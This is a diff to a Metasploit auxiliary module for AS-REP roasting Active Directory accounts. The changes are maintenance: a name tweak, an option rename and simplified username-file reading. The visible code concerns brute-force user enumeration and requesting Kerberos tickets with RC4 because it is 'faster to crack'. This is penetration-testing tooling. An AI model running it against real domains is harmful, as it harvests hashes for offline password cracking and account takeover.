@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Find Users Without Pre-Auth Required',
+        'Name' => 'Find Users Without Pre-Auth Required (ASREP-roast)',
         'Description' => %q{
           This module searches for AD users without pre-auth required. Two different approaches
           are provided:
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptPath.new('USER_FILE', [ false, 'File containing usernames, one per line' ], conditions: %w[ACTION == BRUTE_FORCE]),
         OptBool.new('USE_RC4_HMAC', [ true, 'Request using RC4 hash instead of default encryption types (faster to crack)', true]),
-        OptString.new('RHostname', [ true, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
+        OptString.new('Rhostname', [ true, "The domain controller's hostname"], aliases: ['LDAP::Rhostname']),
       ]
     )
     register_advanced_options(
@@ -75,9 +75,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Msf::Module::Failure::BadConfig, 'User file must be specified when brute forcing')
     end
     if user_file.present?
-      File.open(user_file, 'rb') do |user_fd|
-        user_fd.each_line do |user_from_file|
-          user_from_file.chomp!
+      File.open(user_file, 'rb') do |file|
+        file.each_line(chomp: true) do |user_from_file|
           begin
             roast(user_from_file)
             result_count += 1
@@ -98,7 +97,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_ldap
-    fail_with(Msf::Module::Failure::BadConfig, 'Must provide a username for connecting to LDAP') if (datastore['USERNAME'].nil? || datastore['USERNAME'].empty?)
+    fail_with(Msf::Module::Failure::BadConfig, 'Must provide a username for connecting to LDAP') if (datastore['USERNAME'].blank?)
 
     ldap_connect do |ldap|
       validate_bind_success!(ldap)
@@ -135,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def roast(username)
     res = send_request_tgt(
-      server_name: datastore['RHostname'],
+      server_name: datastore['Rhostname'],
       client_name: username,
       realm: datastore['DOMAIN'],
       offered_etypes: etypes,
